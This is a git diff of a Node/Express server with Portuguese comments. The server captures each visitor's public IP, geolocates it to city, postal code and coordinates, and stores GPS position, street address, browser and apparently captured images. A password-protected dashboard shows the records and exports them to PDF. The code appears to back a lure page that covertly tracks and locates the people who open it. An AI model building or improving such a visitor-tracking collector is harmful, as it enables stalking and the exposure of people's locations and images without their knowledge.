@@ -25,7 +25,7 @@ app.set('trust proxy', true);
 // ========== ARMAZENAMENTO ==========
 let dadosRecebidos = [];
 
-// ========== FUNÇÃO MELHORADA PARA OBTER IP PÚBLICO REAL (com foco em IPv4 visível) ==========
+// ========== FUNÇÃO MELHORADA PARA OBTER IP PÚBLICO REAL ==========
 async function obterIPPublicoReal(req) {
   try {
     console.log('🔍 Iniciando captura de IP público...');
@@ -41,7 +41,6 @@ async function obterIPPublicoReal(req) {
       trueClientIP: req.headers['true-client-ip'],
       forwarded: req.headers['forwarded']
     };
-
     let clientIP = null;
     if (ips.xForwardedFor) {
       clientIP = ips.xForwardedFor.split(',')[0].trim();
@@ -56,15 +55,11 @@ async function obterIPPublicoReal(req) {
     } else {
       clientIP = ips.remoteAddress || ips.socketAddress || ips.connectionSocket || ips.reqIP;
     }
-
     if (clientIP && clientIP.startsWith('::ffff:')) {
       clientIP = clientIP.substring(7);
     }
-
     let ipPublicoReal = clientIP;
-    let ipPublicoIPv4Real = null; // Vamos buscar um IPv4 público real
     let dadosGeoIP = {};
-
     const isPrivateIP = clientIP && (
       clientIP.startsWith('192.168.') || 
       clientIP.startsWith('10.') || 
@@ -75,18 +70,20 @@ async function obterIPPublicoReal(req) {
       clientIP.startsWith('169.254.')
     );
 
-    // Lista de serviços que retornam apenas IPv4 (os mais confiáveis)
-    const servicosIPv4 = [
-      'https://api.ipify.org?format=json',           // Muito confiável
-      'https://checkip.amazonaws.com',               // Retorna só IPv4
-      'https://ifconfig.me/ip',                      // Simples e direto
-      'https://icanhazip.com',                       // IPv4 por padrão
-      'https://ident.me',                            // Retorna IPv4
-      'https://myexternalip.com/raw'
-    ];
-
-    if (isPrivateIP || !clientIP.includes('.')) {
-      for (const servico of servicosIPv4) {
+    if (isPrivateIP) {
+      const servicos = [
+        'https://api.ipify.org?format=json',
+        'https://httpbin.org/ip',
+        'https://api64.ipify.org?format=json',
+        'https://ipapi.co/ip/',
+        'https://checkip.amazonaws.com',
+        'https://icanhazip.com',
+        'https://ident.me',
+        'https://ifconfig.me/ip',
+        'https://myexternalip.com/raw',
+        'https://wtfismyip.com/text'
+      ];
+      for (const servico of servicos) {
         try {
           const response = await axios.get(servico, { timeout: 5000 });
           let ip = null;
@@ -97,34 +94,20 @@ async function obterIPPublicoReal(req) {
           } else if (typeof response.data === 'string') {
             ip = response.data.trim();
           }
-          // Verifica se é IPv4 válido
-          if (ip && ip.match(/^(?!0)(?!.*\.$)((1?\d?\d|2[0-4]\d|25[0-5])\.){3}(?!0\d)\d+$/)) {
-            ipPublicoIPv4Real = ip;
-            ipPublicoReal = ip; // Usa o IPv4 como principal se não tiver
+          if (ip && !ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('172.')) {
+            ipPublicoReal = ip;
             break;
           }
         } catch (err) {
-          console.log(`❌ Falha no serviço IPv4: ${servico}`, err.message);
+          console.log(`❌ Falha no serviço: ${servico}`, err.message);
         }
       }
-    } else if (clientIP.includes('.')) {
-      // Se já for um IPv4, validamos e usamos
-      if (clientIP.match(/^(?!0)(?!.*\.$)((1?\d?\d|2[0-4]\d|25[0-5])\.){3}(?!0\d)\d+$/)) {
-        ipPublicoIPv4Real = clientIP;
-      }
     }
-
-    // Se não conseguiu IPv4, marcar como não disponível
-    if (!ipPublicoIPv4Real) {
-      ipPublicoIPv4Real = 'Não disponível';
-    }
-
-    const ipParaGeo = ipPublicoIPv4Real !== 'Não disponível' ? ipPublicoIPv4Real : ipPublicoReal;
 
     const geoServicos = [
-      `http://ip-api.com/json/${ipParaGeo}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`,
-      `https://ipapi.co/${ipParaGeo}/json/`,
-      `http://www.geoplugin.net/json.gp?ip=${ipParaGeo}`
+      `http://ip-api.com/json/${ipPublicoReal}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`,
+      `https://ipapi.co/${ipPublicoReal}/json/`,
+      `http://www.geoplugin.net/json.gp?ip=${ipPublicoReal}`
     ];
     for (const servicoGeo of geoServicos) {
       try {
@@ -155,7 +138,6 @@ async function obterIPPublicoReal(req) {
       ipOriginal: clientIP,
       ipPublico: ipPublicoReal,
       ipPublicoOperadora: ipPublicoReal,
-      ipPublicoIPv4Real, // Novo campo: IPv4 real visível no "meu ip"
       ipv4: (clientIP && clientIP.includes('.')) ? clientIP : 'Não detectado',
       ipv6: (clientIP && clientIP.includes(':') && !clientIP.startsWith('::ffff:')) ? clientIP : 'Não detectado',
       todosIPs: ips,
@@ -182,7 +164,6 @@ async function obterIPPublicoReal(req) {
       ipOriginal: 'Erro na captura',
       ipPublico: 'Erro na captura',
       ipPublicoOperadora: 'Erro na captura',
-      ipPublicoIPv4Real: 'Erro',
       ipv4: 'Erro',
       ipv6: 'Erro',
       todosIPs: {},
@@ -256,7 +237,6 @@ app.post('/dados', async (req, res) => {
     ipOriginal: dadosIP.ipOriginal,
     ipPublico: dadosIP.ipPublico,
     ipPublicoOperadora: dadosIP.ipPublicoOperadora,
-    ipPublicoIPv4Real: dadosIP.ipPublicoIPv4Real, // Novo campo adicionado
     ipv4: dadosIP.ipv4,
     ipv6: dadosIP.ipv6,
     ehIPPrivado: dadosIP.ehIPPrivado,
@@ -264,7 +244,7 @@ app.post('/dados', async (req, res) => {
     codigoPais: dadosIP.geolocalizacao.codigoPais,
     estado: dadosIP.geolocalizacao.estado,
     cidade: dadosIP.geolocalizacao.cidade,
-    cep: dadosIP.geolocalizacao.cep,
+    cep: dadosIP.geolocalizacao.cep, // CEP do IP público
     latitudeIP: dadosIP.geolocalizacao.latitude,
     longitudeIP: dadosIP.geolocalizacao.longitude,
     timezone: dadosIP.geolocalizacao.timezone,
@@ -272,7 +252,7 @@ app.post('/dados', async (req, res) => {
     organizacao: dadosIP.provedor.organizacao,
     sistemaAutonomo: dadosIP.provedor.as,
     todosIPs: dadosIP.todosIPs,
-    cepGPS
+    cepGPS // CEP real do GPS, obtido automaticamente
   };
 
   dadosRecebidos.push(registro);
@@ -283,6 +263,7 @@ app.post('/dados', async (req, res) => {
 app.post('/acesso', async (req, res) => {
   const horario = new Date().toLocaleString();
   const dadosIP = await obterIPPublicoReal(req);
+
   const registro = {
     horario,
     origem: 'index.html',
@@ -290,7 +271,6 @@ app.post('/acesso', async (req, res) => {
     ipOriginal: dadosIP.ipOriginal,
     ipPublico: dadosIP.ipPublico,
     ipPublicoOperadora: dadosIP.ipPublicoOperadora,
-    ipPublicoIPv4Real: dadosIP.ipPublicoIPv4Real,
     ipv4: dadosIP.ipv4,
     ipv6: dadosIP.ipv6,
     ehIPPrivado: dadosIP.ehIPPrivado,
@@ -308,6 +288,7 @@ app.post('/acesso', async (req, res) => {
     todosIPs: dadosIP.todosIPs,
     cepGPS: 'Não disponível'
   };
+
   dadosRecebidos.push(registro);
   res.sendStatus(200);
 });
@@ -319,8 +300,7 @@ app.get('/dados-json', autenticar, (req, res) => {
 
 // ========== DASHBOARD HTML DINÂMICO ==========
 app.get('/dashboard', autenticar, (req, res) => {
-  const html = `
-<!DOCTYPE html>
+  const html = `<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
@@ -411,6 +391,15 @@ app.get('/dashboard', autenticar, (req, res) => {
       position: relative;
       word-break: break-word;
     }
+    .card h2 {
+      font-size: 1.25rem;
+      font-weight: 700;
+      margin-bottom: 18px;
+      color: #c8b5ff;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
     .card.basic { border-left-color: #ad54ff; }
     .card.ip { border-left-color: #e94e4c; }
     .card.geo { border-left-color: #4f9f6f; }
@@ -479,7 +468,6 @@ app.get('/dashboard', autenticar, (req, res) => {
   </div>
   <div class="stats" id="stats"></div>
   <div id="dashboard-container"></div>
-
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
   <script>
     let dadosGlobais = [];
@@ -491,9 +479,8 @@ app.get('/dashboard', autenticar, (req, res) => {
         const total = dados.length;
         const capturas = dados.filter(d => d.imagem).length;
         const acessos = dados.filter(d => d.origem === 'index.html').length;
-        const ipsUnicos = [...new Set(dados.map(d => d.ipPublicoIPv4Real))].length;
+        const ipsUnicos = [...new Set(dados.map(d => d.ipPublicoOperadora))].length;
         const ultimo = total > 0 ? dados[total - 1].horario : '-';
-
         document.getElementById('stats').innerHTML = \`
           <div class="stat-card">
             <div class="stat-number">\${total}</div>
@@ -509,14 +496,13 @@ app.get('/dashboard', autenticar, (req, res) => {
           </div>
           <div class="stat-card">
             <div class="stat-number">\${ipsUnicos}</div>
-            <div>IPs IPv4 Únicos</div>
+            <div>IPs Únicos</div>
           </div>
           <div class="stat-card" style="color: #8888bb; font-size: 0.85rem;">
             <div>Último Acesso</div>
             <div>\${ultimo}</div>
           </div>
         \`;
-
         const container = document.getElementById('dashboard-container');
         container.innerHTML = dados.slice().reverse().map((dado, idx) => \`
           <div class="card basic">
@@ -532,15 +518,15 @@ app.get('/dashboard', autenticar, (req, res) => {
               <div class="info"><strong>Navegador:</strong> \${dado.navegador || 'Não informado'}</div>
             </div>
             <div class="section ip">
-              <h3><span class="emoji">🌐</span> IP Público Visível (Meu IP)</h3>
+              <h3><span class="emoji">🌐</span> IP Público da Operadora</h3>
               <div class="info">
-                <strong>IP Público IPv4 (Real):</strong> 
-                <span style="color: #00d4ff; font-weight: 700;">\${dado.ipPublicoIPv4Real || 'Não disponível'}</span>
-                <span class="highlight">\${dado.ehIPPrivado ? 'Convertido' : 'Direto'}</span>
+                <strong>IP Público Real:</strong> 
+                <span style="color: #efa942;">\${dado.ipPublicoOperadora || dado.ipPublico || 'Não capturado'}</span>
+                <span class="highlight">\${dado.ehIPPrivado ? 'Convertido de IP Privado' : 'IP Direto'}</span>
               </div>
               <div class="info"><strong>IP Original Detectado:</strong> \${dado.ipOriginal || 'Não informado'}</div>
-              <div class="info"><strong>IPv4 do Cliente:</strong> \${dado.ipv4 || 'Não detectado'}</div>
-              <div class="info"><strong>IPv6 do Cliente:</strong> \${dado.ipv6 || 'Não detectado'}</div>
+              <div class="info"><strong>IPv4:</strong> \${dado.ipv4 || 'Não detectado'}</div>
+              <div class="info"><strong>IPv6:</strong> \${dado.ipv6 || 'Não detectado'}</div>
             </div>
             <div class="section geo">
               <h3><span class="emoji">🗺️</span> Localização por IP Público</h3>
@@ -563,8 +549,6 @@ app.get('/dashboard', autenticar, (req, res) => {
                 <div class="info"><strong>Endereço GPS:</strong> \${dado.endereco || 'Não informado'}</div>
                 <div class="info"><strong>Coordenadas GPS:</strong> \${(dado.latitude && dado.longitude) ? dado.latitude + ', ' + dado.longitude : 'Não disponível'}</div>
                 <div class="info"><strong>CEP (GPS):</strong> \${dado.cepGPS || 'Não informado'}</div>
-                <div class="info"><strong>IPv4 do Visitante:</strong> \${dado.ipv4 || 'Não detectado'}</div>
-                <div class="info"><strong>IPv6 do Visitante:</strong> \${dado.ipv6 || 'Não detectado'}</div>
               </div>
             \` : ''}
             \${dado.imagem ? \`
@@ -604,10 +588,8 @@ app.get('/dashboard', autenticar, (req, res) => {
           doc.setFontSize(11);
           doc.setTextColor('#333333');
           doc.text(\`Horário: \${dado.horario || '-'}\`, 50, y); y += 15;
-          doc.text(\`IP Real (IPv4): \${dado.ipPublicoIPv4Real || '-'}\`, 50, y); y += 15;
+          doc.text(\`IP Público: \${dado.ipPublicoOperadora || '-'}\`, 50, y); y += 15;
           doc.text(\`IP Original: \${dado.ipOriginal || '-'}\`, 50, y); y += 15;
-          doc.text(\`IPv4: \${dado.ipv4 || '-'}\`, 50, y); y += 15;
-          doc.text(\`IPv6: \${dado.ipv6 || '-'}\`, 50, y); y += 15;
           doc.text(\`País: \${dado.pais || '-'} | Estado: \${dado.estado || '-'}\`, 50, y); y += 15;
           doc.text(\`Cidade: \${dado.cidade || '-'} | CEP: \${dado.cep || '-'}\`, 50, y); y += 15;
           doc.text(\`CEP (GPS): \${dado.cepGPS || '-'}\`, 50, y); y += 15;
@@ -636,12 +618,12 @@ app.get('/dashboard', autenticar, (req, res) => {
 // ========== ROTA DE TESTE DE IP ==========
 app.get('/meu-ip', async (req, res) => {
   const dadosIP = await obterIPPublicoReal(req);
-  res.json({ message: 'Seu IP público IPv4 real (como no meuip)', dados: dadosIP });
+  res.json({ message: 'Seu IP público da operadora', dados: dadosIP });
 });
 
 // ========== MIDDLEWARE DE LOG ==========
 app.use((req, res, next) => {
-  console.log('📝 ' + new Date().toLocaleString() + ' - ' + req.method + ' ' + req.path + ' - IP: ' + req.ip);
+  console.log(`📝 ${new Date().toLocaleString()} - ${req.method} ${req.path} - IP: ${req.ip}`);
   next();
 });
 
